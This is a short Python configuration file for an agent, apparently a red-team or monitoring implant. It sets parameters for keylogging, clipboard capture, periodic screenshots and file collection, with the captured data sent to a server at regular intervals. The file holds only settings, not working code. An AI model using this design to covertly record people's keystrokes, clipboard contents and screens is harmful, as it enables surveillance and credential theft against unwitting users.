# General configuration settings for the agent
SERVER_URL = "http://localhost:8000"
METRICS_INTERVAL = 60 # seconds between sending heartbeat metrics to server

APP_NAME = "alisium-agent"
LOGS_DIR = "logs"
DATA_DIR = "data"
AGENT_FILE = f"{DATA_DIR}/agent_id.txt"

# --------------------
# Read Team Activity:
# --------------------

# Keylogger configuration
KEYLOG_FILE = f"{DATA_DIR}/keylog.jsonl"
KEYLOG_FLUSH_INTERVAL = 5 # seconds
KEYLOG_BATCH_SIZE = 20 # number of entries before flush
LAST_APP_CHECK = 0 # timestamp of last app check
APP_CACHE_TTL = 1  # seconds to cache active app name before re-checking
KEYLOG_SEND_INTERVAL = 60 # seconds between sending logs to server

# Clipboard configuration
CLIPBOARD_FILE = f"{DATA_DIR}/clipboard.jsonl"
CLIPBOARD_FLUSH_INTERVAL = 5 # seconds
CLIPBOARD_BATCH_SIZE = 20 # number of entries before flush
CLIPBOARD_SEND_INTERVAL = 60 # seconds between sending logs to server
CLIPBOARD_MIN_LENGTH = 2 # minimum clipboard content length
CLIPBOARD_MAX_LENGTH = 1000 # maximum clipboard content length

# Screenshot configuration
SCREENSHOT_FOLDER = f"{DATA_DIR}/screenshots/"
SCREENSHOT_MAX_COUNT = 100 # maximum number of screenshots to keep in the folder
SCREENSHOT_INTERVAL = 60  # seconds between screenshots
SCREENSHOT_QUALITY = 10  # JPEG quality for compression (0-100)

# Filesystem configuration
MAX_FILE_SIZE = 2 * 1024 * 1024  # 2MB